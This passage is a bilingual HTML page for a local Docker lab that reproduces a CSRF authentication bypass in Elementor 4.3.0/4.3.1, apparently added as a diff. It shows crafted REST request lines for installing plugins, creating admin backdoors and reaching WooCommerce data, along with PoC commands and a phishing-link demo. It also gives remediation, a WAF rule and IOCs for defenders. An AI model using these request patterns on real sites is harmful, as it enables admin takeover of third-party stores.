+GET /wp-json/wp/v2/plugins?_method=POST&amp;slug=hello-dolly&amp;x=...   <span class='ko'>-&gt; 201</span> (installed)
+GET /wp-json/wp/v2/plugins/hello?_method=POST&amp;status=active&amp;x=... <span class='ko'>-&gt; 200</span> (active)">WooCommerce 11.1.2 (exige API keys, no cookies, en /wc/v3):
+GET /wc/v3/system_status                     (cookies admin) -&gt; <span class="ok">401 woocommerce_rest_cannot_view</span>
+GET /wc/v3/system_status?x=elementor/v1/events/               -&gt; <span class="ko">200 {"environment":...}</span>
+
+<span class="c"># y el endpoint de plugins del core, con dos enlaces:</span>
+GET /wp-json/wp/v2/plugins?_method=POST&amp;slug=hello-dolly&amp;x=...   <span class="ko">-&gt; 201</span> (instalado)
+GET /wp-json/wp/v2/plugins/hello?_method=POST&amp;status=active&amp;x=... <span class="ko">-&gt; 200</span> (activo)</pre>
+    <p data-es="En una tienda Elementor 4.3.0/4.3.1 + WooCommerce, un clic abre el REST completo de la tienda (pedidos, clientes, cupones) — y dos clics instalan y activan cualquier plugin del repositorio oficial. El caso real de lo que predijo §3."
+       data-en="On a store running Elementor 4.3.0/4.3.1 + WooCommerce, one click opens the full store REST API (orders, customers, coupons) — and two clicks install and activate any plugin from the official directory. The real-world case §3 predicted.">En una tienda Elementor 4.3.0/4.3.1 + WooCommerce, un clic abre el REST completo de la tienda (pedidos, clientes, cupones) — y dos clics instalan y activan cualquier plugin del repositorio oficial. El caso real de lo que predijo §3.</p>
+
+    <h3 data-es="Detalles forenses y negativos útiles" data-en="Forensic details and useful negatives">Detalles forenses y negativos útiles</h3>
+    <ul style="color:var(--dim);font-size:.92rem">
+      <li data-es="<code>%2F</code> desactiva la subcadena mágica (compara el URI crudo): matiz para generadores de URLs sobre-codificantes."
+          data-en="<code>%2F</code> disables the magic substring (it matches the raw URI): a nuance for over-encoding URL generators."><code>%2F</code> desactiva la subcadena mágica (compara el URI crudo): matiz para generadores de URLs sobre-codificantes.</li>
+      <li data-es="La subcadena anidada en otro parámetro (<code>q=foo-elementor/v1/events/-bar</code>) también dispara: <code>/wp/v2/settings</code> pasa de 401 a 200 filtrando el email del admin."
+          data-en="The substring nested inside another parameter (<code>q=foo-elementor/v1/events/-bar</code>) also triggers: <code>/wp/v2/settings</code> goes 401 → 200 leaking the admin email.">La subcadena anidada en otro parámetro (<code>q=foo-elementor/v1/events/-bar</code>) también dispara: <code>/wp/v2/settings</code> pasa de 401 a 200 filtrando el email del admin.</li>
+      <li data-es="Blast radius: 231 rutas REST / <b>154 endpoints de escritura</b> alcanzables en una instalación base."
+          data-en="Blast radius: 231 REST routes / <b>154 write endpoints</b> reachable on a base install.">Blast radius: 231 rutas REST / <b>154 endpoints de escritura</b> alcanzables en una instalación base.</li>
+      <li data-es="Negativo útil: <code>/wp/v2/settings</code> NO expone <code>users_can_register</code> ni <code>default_role</code> — la vía «un clic activa registro libre con rol admin» no existe por REST."
+          data-en="Useful negative: <code>/wp/v2/settings</code> does NOT expose <code>users_can_register</code> or <code>default_role</code> — the “one click enables open registration with admin role” path doesn’t exist via REST.">Negativo útil: <code>/wp/v2/settings</code> NO expone <code>users_can_register</code> ni <code>default_role</code> — la vía «un clic activa registro libre con rol admin» no existe por REST.</li>
+      <li data-es="Negativo útil: ningún bypass del parche — con 4.3.2 todos los vectores (canónico y propios) devuelven 401."
+          data-en="Useful negative: no patch bypass — on 4.3.2 every vector (canonical and ours) returns 401.">Negativo útil: ningún bypass del parche — con 4.3.2 todos los vectores (canónico y propios) devuelven 401.</li>
+    </ul>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">03c</span><span data-es="Cronología y versiones" data-en="Timeline and versions">Cronología y versiones</span></h2>
+    <ul class="tl">
+      <li><time>2026-09-01</time><p data-es="Elementor 4.3.1 en wordpress.org (el módulo Editor Events viene de la 4.3.0)" data-en="Elementor 4.3.1 on wordpress.org (the Editor Events module dates from 4.3.0)">Elementor 4.3.1 en wordpress.org (el módulo Editor Events viene de la 4.3.0)</p></li>
+      <li><time>2026-09-22</time><p data-es="Saggre reporta el fallo a Patchstack" data-en="Saggre reports the flaw to Patchstack">Saggre reporta el fallo a Patchstack</p></li>
+      <li><time>2026-09-24</time><p data-es="Elementor publica 4.3.2 con el parche" data-en="Elementor ships 4.3.2 with the fix">Elementor publica 4.3.2 con el parche</p></li>
+      <li><time>2026-09-25</time><p data-es="Advisory público (CVSS 8.8, hasta ~2M de sitios)" data-en="Public advisory (CVSS 8.8, up to ~2M sites)">Advisory público (CVSS 8.8, hasta ~2M de sitios)</p></li>
+      <li><time>2026-09-25</time><p data-es="elhacker.net publica la noticia que motiva este lab" data-en="elhacker.net publishes the news that motivated this lab">elhacker.net publica la noticia que motiva este lab</p></li>
+      <li><time>2026-09-26</time><p data-es="Este laboratorio: réplica verificada + control negativo + aportaciones (§03b)" data-en="This lab: verified replica + negative control + contributions (§03b)">Este laboratorio: réplica verificada + control negativo + aportaciones (§03b)</p></li>
+    </ul>
+    <p style="color:var(--dim);font-size:.9rem" data-es="Afecta solo a 4.3.0 y 4.3.1 (archivo vulnerable idéntico byte a byte). Sin CVE asignado en el momento del lab. Instalaciones limpias de Elementor ≥ 3.32.0 llevan el módulo activo por defecto (experimento oculto)."
+                       data-en="Only 4.3.0 and 4.3.1 are affected (byte-identical vulnerable file). No CVE assigned at lab time. Clean installs of Elementor ≥ 3.32.0 have the module active by default (hidden experiment).">Afecta solo a 4.3.0 y 4.3.1 (archivo vulnerable idéntico byte a byte). Sin CVE asignado en el momento del lab. Instalaciones limpias de Elementor ≥ 3.32.0 llevan el módulo activo por defecto (experimento oculto).</p>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">04</span><span data-es="Experimento de variable única" data-en="Single-variable experiment">Experimento de variable única</span></h2>
+    <p data-es="Misma imagen WordPress (7.1.2), mismo PHP (8.3.35), mismo experimento activo. La única diferencia: Elementor 4.3.1 (víctima, :8085) vs 4.3.2 (control, :8086)."
+       data-en="Same WordPress image (7.1.2), same PHP (8.3.35), same active experiment. The only difference: Elementor 4.3.1 (victim, :8085) vs 4.3.2 (control, :8086).">Misma imagen WordPress (7.1.2), mismo PHP (8.3.35), mismo experimento activo. La única diferencia: Elementor 4.3.1 (víctima, :8085) vs 4.3.2 (control, :8086).</p>
+    <div class="verdict">
+      <div class="v vuln">
+        <h4>VÍCTIMA · Elementor 4.3.1</h4>
+        <table>
+          <tr><th data-es="Prueba" data-en="Test">Prueba</th><th>HTTP</th></tr>
+          <tr><td data-es="crear admin sin subcadena" data-en="create admin without substring">crear admin sin subcadena</td><td class="ok">401</td></tr>
+          <tr><td data-es="crear admin CON subcadena" data-en="create admin WITH substring">crear admin CON subcadena</td><td class="ko">201</td></tr>
+          <tr><td data-es="app-password con subcadena (§1)" data-en="app-password with substring (§1)">app-password con subcadena (§1)</td><td class="ko">201</td></tr>
+          <tr><td data-es="promover subscriber (§2)" data-en="promote subscriber (§2)">promover subscriber (§2)</td><td class="ko">200</td></tr>
+          <tr><td data-es="ataque con hardening activo (§3)" data-en="attack with hardening on (§3)">ataque con hardening activo (§3)</td><td class="ko">201</td></tr>
+          <tr><td data-es="WooCommerce /wc/v3 (§5)" data-en="WooCommerce /wc/v3 (§5)">WooCommerce /wc/v3 (§5)</td><td class="ko">200</td></tr>
+          <tr><td data-es="experimento inactive (paliativa)" data-en="experiment inactive (palliative)">experimento inactive (paliativa)</td><td class="ok">401</td></tr>
+          <tr><td>/wp/v2/settings?q=…events/…</td><td class="ko">200</td></tr>
+        </table>
+      </div>
+      <div class="v parche">
+        <h4>CONTROL · Elementor 4.3.2</h4>
+        <table>
+          <tr><th data-es="Prueba" data-en="Test">Prueba</th><th>HTTP</th></tr>
+          <tr><td data-es="crear admin sin subcadena" data-en="create admin without substring">crear admin sin subcadena</td><td class="ok">401</td></tr>
+          <tr><td data-es="crear admin CON subcadena" data-en="create admin WITH substring">crear admin CON subcadena</td><td class="ok">401</td></tr>
+          <tr><td data-es="app-password con subcadena (§1)" data-en="app-password with substring (§1)">app-password con subcadena (§1)</td><td class="ok">401</td></tr>
+          <tr><td data-es="promover subscriber (§2)" data-en="promote subscriber (§2)">promover subscriber (§2)</td><td class="ok">401</td></tr>
+          <tr><td>/wp/v2/settings?q=…events/…</td><td class="ok">401</td></tr>
+          <tr><td>/author/csrfadmin/</td><td class="ok">404</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">05</span><span data-es="Evidencia visual (capturas reales del laboratorio)" data-en="Visual evidence (real lab captures)">Evidencia visual (capturas reales del laboratorio)</span></h2>
+    <p style="color:var(--dim);font-size:.9rem" data-es="Regenerables con <code>make capturas</code>. Clic para ampliar."
+       data-en="Regenerable with <code>make capturas</code>. Click to zoom.">Regenerables con <code>make capturas</code>. Clic para ampliar.</p>
+    <div class="gallery">
+      <figure class="shot">
+        <img src="img/navegador-victima.png" alt="víctima: página pública Author: csrfadmin" onclick="lb(this)">
+        <figcaption data-es="Víctima 4.3.1 — la página pública del autor csrfadmin EXISTE: la puerta trasera es visible en el frontend tras el ataque."
+                    data-en="Victim 4.3.1 — csrfadmin’s public author page EXISTS: the backdoor is visible on the frontend after the attack.">Víctima 4.3.1 — la página pública del autor csrfadmin EXISTE: la puerta trasera es visible en el frontend tras el ataque.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/navegador-control.png" alt="control: Page not found" onclick="lb(this)">
+        <figcaption data-es="Control 4.3.2 — el mismo ataque: Page not found. El usuario jamás llegó a crearse."
+                    data-en="Control 4.3.2 — same attack: Page not found. The user was never created.">Control 4.3.2 — el mismo ataque: Page not found. El usuario jamás llegó a crearse.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/navegador-phishing.png" alt="correo de phishing simulado" onclick="lb(this)">
+        <figcaption data-es="El «correo» que recibe la víctima: un solo &amp;lt;a&amp;gt; con el payload en la query. Sin JS, sin formulario."
+                    data-en="The “email” the victim gets: a single &amp;lt;a&amp;gt; with the payload in the query. No JS, no form.">El «correo» que recibe la víctima: un solo &lt;a&gt; con el payload en la query. Sin JS, sin formulario.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-fase3.png" alt="terminal: make click" onclick="lb(this)">
+        <figcaption data-es="FASE 3 · el clic: 401 sin la subcadena → 201 con ella, en la víctima."
+                    data-en="PHASE 3 · the click: 401 without the substring → 201 with it, on the victim.">FASE 3 · el clic: 401 sin la subcadena → 201 con ella, en la víctima.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-aportaciones.png" alt="terminal: make aportaciones" onclick="lb(this)">
+        <figcaption data-es="FASE 6 · aportaciones §1 (app-password en claro) y §2 (subscriber → administrator)."
+                    data-en="PHASE 6 · contributions §1 (cleartext app-password) and §2 (subscriber → administrator).">FASE 6 · aportaciones §1 (app-password en claro) y §2 (subscriber → administrator).</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-firewall.png" alt="terminal: make hardening-demo" onclick="lb(this)">
+        <figcaption data-es="FASE 7 · aportación §3: el hardening bloquea [A] y el bypass lo atraviesa [B]."
+                    data-en="PHASE 7 · contribution §3: the hardening blocks [A] and the bypass pierces it [B].">FASE 7 · aportación §3: el hardening bloquea [A] y el bypass lo atraviesa [B].</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-demoflip.png" alt="terminal: make demo-flip" onclick="lb(this)">
+        <figcaption data-es="FASE 5 · root cause en vivo: diff del archivo entre los contenedores 4.3.1 y 4.3.2."
+                    data-en="PHASE 5 · live root cause: diff of the file between the 4.3.1 and 4.3.2 containers.">FASE 5 · root cause en vivo: diff del archivo entre los contenedores 4.3.1 y 4.3.2.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/demo-navegador.gif?v=2" alt="GIF: demo con navegador real" onclick="lb(this)">
+        <figcaption data-es="NAVEGADOR REAL (CDP): login del admin → correo desde file:// (otro origen) → CLIC → HTTP 201. SameSite=Lax medido, no razonado."
+                    data-en="REAL browser (CDP): admin login → email from file:// (another origin) → CLICK → HTTP 201. SameSite=Lax measured, not reasoned.">NAVEGADOR REAL (CDP): login del admin → correo desde file:// (otro origen) → CLIC → HTTP 201. SameSite=Lax medido, no razonado.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-mitigacion.png" alt="terminal: make mitigacion-demo" onclick="lb(this)">
+        <figcaption data-es="FASE 8 · paliativa verificada A/B/C: 201 → experimento inactive → 401 → restauración."
+                    data-en="PHASE 8 · palliative verified A/B/C: 201 → experiment inactive → 401 → restored.">FASE 8 · paliativa verificada A/B/C: 201 → experimento inactive → 401 → restauración.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/terminal-blast.png" alt="terminal: make blast-radius" onclick="lb(this)">
+        <figcaption data-es="FASE 9 · plugins por GET (201+200) y WooCommerce 401→200 con la subcadena (§5)."
+                    data-en="PHASE 9 · plugins via GET (201+200) and WooCommerce 401→200 with the substring (§5).">FASE 9 · plugins por GET (201+200) y WooCommerce 401→200 con la subcadena (§5).</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="img/navegador-bot.png" alt="bot víctima del CTF" onclick="lb(this)">
+        <figcaption data-es="El bot víctima del CTF «La Subcadena Mágica»: pega un enlace y el admin de pruebas lo pulsa con SU sesión (make ctf)."
+                    data-en="The CTF victim bot “La Subcadena Mágica”: paste a link and the test admin clicks it with THEIR session (make ctf).">El bot víctima del CTF «La Subcadena Mágica»: pega un enlace y el admin de pruebas lo pulsa con SU sesión (make ctf).</figcaption>
+      </figure>
+    </div>
+    <div id="lightbox" onclick="this.classList.remove('abierto')">
+      <img id="lb-img" src="" alt="">
+      <figcaption id="lb-cap"></figcaption>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">06</span><span data-es="Pruébalo en tu máquina" data-en="Run it on your machine">Pruébalo en tu máquina</span></h2>
+    <div class="qs">
+      <p style="margin:0" data-es="Requisitos: Docker, docker compose, curl, python3, make. El lab usa los puertos <b>8085/8086/8095</b> (8080/8081 suelen estar ocupados)."
+                            data-en="Requirements: Docker, docker compose, curl, python3, make. The lab uses ports <b>8085/8086/8095</b> (8080/8081 are usually taken).">Requisitos: Docker, docker compose, curl, python3, make. El lab usa los puertos <b>8085/8086/8095</b> (8080/8081 suelen estar ocupados).</p>
+      <pre><span class="cmd">make lab</span>             <span class="c"># víctima: WP + Elementor 4.3.1 en http://localhost:8085 (admin/admin)</span>
+<span class="cmd">make fingerprint</span>     <span class="c"># FASE 1: reconocimiento pasivo</span>
+<span class="cmd">make link</span>            <span class="c"># FASE 2: enlace malicioso + correo simulado</span>
+<span class="cmd">make click</span>           <span class="c"># FASE 3: el clic del admin (401 -&gt; 201 -&gt; %2F)</span>
+<span class="cmd">make verify</span>          <span class="c"># FASE 4: csrfadmin es admin de verdad</span>
+<span class="cmd">make aportaciones</span>    <span class="c"># FASE 6: puerta silenciosa + cuenta dormida (propia)</span>
+<span class="cmd">make hardening-demo</span>  <span class="c"># FASE 7: hardening anti-CSRF neutralizado (propia)</span>
+<span class="cmd">make mitigacion-demo</span> <span class="c"># FASE 8: paliativa verificada A/B/C</span>
+<span class="cmd">make blast-radius</span>    <span class="c"># FASE 9: plugins por GET + WooCommerce (propia, §5)</span>
+<span class="cmd">make demo-navegador</span>  <span class="c"># navegador REAL: correo -&gt; clic -&gt; 201 (GIF arriba)</span>
+<span class="cmd">make fuzz-subcadena</span>  <span class="c"># fuzzer de 8 variantes de la subcadena</span>
+<span class="cmd">make detectar-iocs</span>   <span class="c"># detector de IOCs (blue team)</span>
+<span class="cmd">make ctf</span>             <span class="c"># CTF «La Subcadena Mágica»: reto :8087 + bot :8089</span>
+<span class="cmd">make control</span>         <span class="c"># control negativo: Elementor 4.3.2 en http://localhost:8086</span>
+<span class="cmd">make control-click</span>   <span class="c"># el MISMO enlace contra 4.3.2 -&gt; 401</span>
+<span class="cmd">make demo-flip</span>       <span class="c"># FASE 5: diff del root cause entre contenedores vivos</span>
+<span class="cmd">make full-demo</span>       <span class="c"># todo el encadenado desde cero</span>
+<span class="cmd">make capturas</span>        <span class="c"># regenera esta galería PNG</span>
+<span class="cmd">make clean</span>           <span class="c"># destruye el laboratorio</span></pre>
+      <p style="color:var(--dim);font-size:.9rem;margin:12px 0 0" data-es="Credenciales de la puerta trasera configurables: <code>make click USUARIO=sombra CLAVE='Mi P@ss&amp;2026 !x' EMAIL=s@lab.test</code> (el encoding de la query lo maneja el lab) o <code>python3 cli/poc.py attack --acepta-responsabilidad --username ... --password ...</code>. Demo real con navegador: abre <code>exploit/correo-phishing.html</code> con la sesión del admin iniciada en :8085 y pulsa el botón."
+                                  data-en="Backdoor credentials are configurable: <code>make click USUARIO=sombra CLAVE='My P@ss&amp;2026 !x' EMAIL=s@lab.test</code> (the lab handles query encoding) or <code>python3 cli/poc.py attack --acepta-responsabilidad --username ... --password ...</code>. Real-browser demo: open <code>exploit/correo-phishing.html</code> with the admin logged into :8085 and click the button.">Credenciales de la puerta trasera configurables: <code>make click USUARIO=sombra CLAVE='Mi P@ss&amp;2026 !x' EMAIL=s@lab.test</code> (el encoding de la query lo maneja el lab) o <code>python3 cli/poc.py attack --acepta-responsabilidad --username ... --password ...</code>. Demo real con navegador: abre <code>exploit/correo-phishing.html</code> con la sesión del admin iniciada en :8085 y pulsa el botón.</p>
+      <p style="margin:14px 0 0" data-es="<b>Modo CTF</b> — <code>make ctf</code>: reto aislado en :8087 con hardening activo y un <b>bot víctima</b> en :8089 que pulsa tus enlaces con la sesión de la admin. 5 flags para redescubrir todos los vectores (<a href='https://github.com/686f6c61' rel='noopener'>ctf/README.md</a> del repo)."
+                       data-en="<b>CTF mode</b> — <code>make ctf</code>: isolated challenge at :8087 with hardening on and a <b>victim bot</b> at :8089 that clicks your links with the admin’s session. 5 flags to rediscover every vector (see ctf/README.md in the repo)."><b>Modo CTF</b> — <code>make ctf</code>: reto aislado en :8087 con hardening activo y un <b>bot víctima</b> en :8089 que pulsa tus enlaces con la sesión de la admin. 5 flags para redescubrir todos los vectores (ctf/README.md del repo).</p>
+    </div>
+    <h3 data-es="Estructura del repositorio" data-en="Repository layout">Estructura del repositorio</h3>
+    <pre class="tree">docker-compose.yml         víctima :8085 (4.3.1) · control :8086 (4.3.2) · MySQL
+docker/wordpress/         Dockerfile parametrizado (ARG ELEMENTOR_VERSION) + entrypoint
+exploit/01_fingerprint.sh FASE 1 · reconocimiento pasivo
+exploit/02_craft_link.py  FASE 2 · enlace malicioso + correo simulado (solo localhost)
+exploit/03_click_victim.sh FASE 3 · el clic (login admin + GET -&gt; 201/401)
+exploit/04_verificar_admin.sh FASE 4 · la puerta trasera es admin real
+exploit/05_demo_root_cause.sh FASE 5 · diff en vivo víctima vs control
+exploit/06_aportaciones.sh FASE 6 · §1 puerta silenciosa + §2 cuenta dormida
+exploit/07_hardening_bypass.sh FASE 7 · §3 hardening neutralizado
+cli/poc.py                POC unificado (check/craft/attack/verify/all)
+scripts/capturas/         generador de la galería PNG (Chrome headless)
+research/PARCHE.md        forense del diff 4.3.1 -&gt; 4.3.2 (+SHA256 de los zips)
+research/HALLAZGOS.md     aportaciones propias (§1-§4) + negativos útiles
+research/RESULTADOS.md    evidencia real de ejecución
+research/writeup-original.md fuentes públicas y qué añade este repo
+docs/                     esta landing + galería (GitHub Pages)</pre>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">07</span><span data-es="Defensa" data-en="Defense">Defensa</span></h2>
+    <div class="grid">
+      <div class="card"><h3 data-es="Remediación" data-en="Remediation">Remediación</h3>
+        <p data-es="Actualizar a Elementor ≥ 4.3.2. Sin alternativa segura en 4.3.0/4.3.1 mientras el experimento esté activo."
+           data-en="Upgrade to Elementor ≥ 4.3.2. No safe alternative on 4.3.0/4.3.1 while the experiment is active.">Actualizar a Elementor ≥ 4.3.2. Sin alternativa segura en 4.3.0/4.3.1 mientras el experimento esté activo.</p></div>
+      <div class="card"><h3 data-es="Paliativa temporal" data-en="Temporary palliative">Paliativa temporal</h3>
+        <p><code>wp option update elementor_experiment-editor_events inactive</code></p>
+        <p data-es="Apaga el experimento oculto (no aparece en la UI). O WAF: query con <code>elementor/v1/events/</code> en paths que NO empiecen por <code>/wp-json/elementor/v1/events/</code>."
+           data-en="Turns the hidden experiment off (not visible in the UI). Or WAF: query containing <code>elementor/v1/events/</code> on paths NOT starting with <code>/wp-json/elementor/v1/events/</code>.">Apaga el experimento oculto (no aparece en la UI). O WAF: query con <code>elementor/v1/events/</code> en paths que NO empiecen por <code>/wp-json/elementor/v1/events/</code>.</p></div>
+      <div class="card"><h3 data-es="IOCs (access log)" data-en="IOCs (access log)">IOCs (access log)</h3>
+        <p data-es="GET con <code>_method=POST</code> + <code>roles%5B%5D=administrator</code> + <code>elementor/v1/events/</code> en la misma línea; la subcadena de telemetría en rutas ajenas (<code>/wp/v2/settings?q=…events/…</code>); GET sobre <code>application-passwords</code> con <code>_method=POST</code>."
+           data-en="GET with <code>_method=POST</code> + <code>roles%5B%5D=administrator</code> + <code>elementor/v1/events/</code> on the same line; the telemetry substring on foreign routes (<code>/wp/v2/settings?q=…events/…</code>); GET on <code>application-passwords</code> with <code>_method=POST</code>.">GET con <code>_method=POST</code> + <code>roles%5B%5D=administrator</code> + <code>elementor/v1/events/</code> en la misma línea; la subcadena de telemetría en rutas ajenas (<code>/wp/v2/settings?q=…events/…</code>); GET sobre <code>application-passwords</code> con <code>_method=POST</code>.</p></div>
+      <div class="card"><h3 data-es="Respuesta a incidentes" data-en="Incident response">Respuesta a incidentes</h3>
+        <p data-es="Usuarios creados alrededor del clic · roles cambiados en cuentas viejas · <b>revocar Application Passwords</b> de los admins (borrar usuarios no basta — §1) · rotar credenciales."
+           data-en="Users created around the click · role changes on old accounts · <b>revoke admins’ Application Passwords</b> (deleting users isn’t enough — §1) · rotate credentials.">Usuarios creados alrededor del clic · roles cambiados en cuentas viejas · <b>revocar Application Passwords</b> de los admins (borrar usuarios no basta — §1) · rotar credenciales.</p></div>
+      <div class="card"><h3 data-es="Lección para auditar" data-en="Audit lesson">Lección para auditar</h3>
+        <p data-es="Un plugin que devuelva <code>true</code> desde <code>rest_authentication_errors</code> es una señal de alarma por definición: ese filtro es de autenticación, no de conveniencia. Y ojo: el hardening sobre ese mismo filtro no protegió contra este bug (§3)."
+           data-en="A plugin returning <code>true</code> from <code>rest_authentication_errors</code> is a red flag by definition: that filter is authentication, not convenience. And note: hardening on that same filter did NOT protect against this bug (§3).">Un plugin que devuelva <code>true</code> desde <code>rest_authentication_errors</code> es una señal de alarma por definición: ese filtro es de autenticación, no de conveniencia. Y ojo: el hardening sobre ese mismo filtro no protegió contra este bug (§3).</p></div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="wrap">
+    <h2><span class="n">08</span><span data-es="Cómo se derivó y verificó" data-en="How it was derived and verified">Cómo se derivó y verificó</span></h2>
+    <ul class="tl">
+      <li><time>1</time><p data-es="Análisis estático de los zips oficiales (SHA256 registrados): localización del archivo vulnerable, diff 4.3.1→4.3.2, verificación de que 4.3.0 es idéntico."
+         data-en="Static analysis of the official zips (SHA256 recorded): locating the vulnerable file, diffing 4.3.1→4.3.2, verifying 4.3.0 is identical.">Análisis estático de los zips oficiales (SHA256 registrados): localización del archivo vulnerable, diff 4.3.1→4.3.2, verificación de que 4.3.0 es idéntico.</p></li>
+      <li><time>2</time><p data-es="Trazado del gating del experimento oculto: instalación limpia ⇒ activo por defecto (condición de ~2M sitios reales, reproducida en el lab)."
+         data-en="Tracing the hidden experiment gating: clean install ⇒ active by default (the condition of ~2M real sites, reproduced in the lab).">Trazado del gating del experimento oculto: instalación limpia ⇒ activo por defecto (condición de ~2M sitios reales, reproducida en el lab).</p></li>
+      <li><time>3</time><p data-es="Lab Docker de variable única (WP 7.1.2 / PHP 8.3.35 idénticos) con instalación desatendida por WP-CLI."
+         data-en="Single-variable Docker lab (identical WP 7.1.2 / PHP 8.3.35) with unattended WP-CLI provisioning.">Lab Docker de variable única (WP 7.1.2 / PHP 8.3.35 idénticos) con instalación desatendida por WP-CLI.</p></li>
+      <li><time>4</time><p data-es="Ronda de hipótesis (sonda de 9 vectores): 3 confirmadas (§1-§3), 2 negativos útiles (settings, bypass del parche), 4 detalles forenses."
+         data-en="Hypothesis round (9-vector probe): 3 confirmed (§1-§3), 2 useful negatives (settings, patch bypass), 4 forensic details.">Ronda de hipótesis (sonda de 9 vectores): 3 confirmadas (§1-§3), 2 negativos útiles (settings, bypass del parche), 4 detalles forenses.</p></li>
+      <li><time>5</time><p data-es="Cada afirmación mapeada a un comando con salida esperada (tabla afirmación→verificación en el README) y capturas regenerables."
+         data-en="Every claim mapped to a command with expected output (claim→verification table in the README) plus regenerable captures.">Cada afirmación mapeada a un comando con salida esperada (tabla afirmación→verificación en el README) y capturas regenerables.</p></li>
+    </ul>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <p data-es="Descubierto por <b>Saggre</b> (Patchstack, 2026-09-22) · parche 4.3.2 (2026-09-24) · advisory público (2026-09-25). Este laboratorio añade réplica verificada, control negativo de una variable, tres aportaciones al campo y material defensivo. Todo corre en contenedores Docker locales desechables."
+       data-en="Found by <b>Saggre</b> (Patchstack, 2026-09-22) · fix 4.3.2 (2026-09-24) · public advisory (2026-09-25). This lab adds a verified replica, a single-variable negative control, three field contributions and defensive material. Everything runs in disposable local Docker containers.">Descubierto por <b>Saggre</b> (Patchstack, 2026-09-22) · parche 4.3.2 (2026-09-24) · advisory público (2026-09-25). Este laboratorio añade réplica verificada, control negativo de una variable, tres aportaciones al campo y material defensivo. Todo corre en contenedores Docker locales desechables.</p>
+    <p><a href="https://patchstack.com/articles/cross-site-request-forgery-in-elementor-plugin-affecting-2-million-sites">Patchstack</a> ·
+       <a href="https://blog.elhacker.net/2026/09/vulnerabilidad-en-elementor-para.html">elhacker.net</a> ·
+       <a href="https://www.bleepingcomputer.com/news/security/elementor-wordpress-flaw-lets-attackers-create-admin-accounts">BleepingComputer</a> ·
+       MIT · <a href="https://x.com/686f6c61">@686f6c61</a></p>
+  </div>
+</footer>
+
+<script>
+function setLang(l){
+  document.querySelectorAll('[data-es]').forEach(function(el){
+    if (el.dataset.es === undefined) return;
+    var html = (l === 'en') ? (el.dataset.en || el.dataset.es) : el.dataset.es;
+    if (html !== undefined) el.innerHTML = html;
+  });
+  document.getElementById('btn-es').classList.toggle('on', l==='es');
+  document.getElementById('btn-en').classList.toggle('on', l==='en');
+  document.documentElement.lang = l;
+}
+function lb(img){
+  document.getElementById('lb-img').src = img.src;
+  var cap = img.parentElement.querySelector('figcaption');
+  document.getElementById('lb-cap').textContent = cap ? cap.textContent : '';
+  document.getElementById('lightbox').classList.add('abierto');
+}
+// enlace directo: index.html?lang=en
+if (location.search.indexOf('lang=en') !== -1) { setLang('en'); }
+</script>
+</body>
+</html>
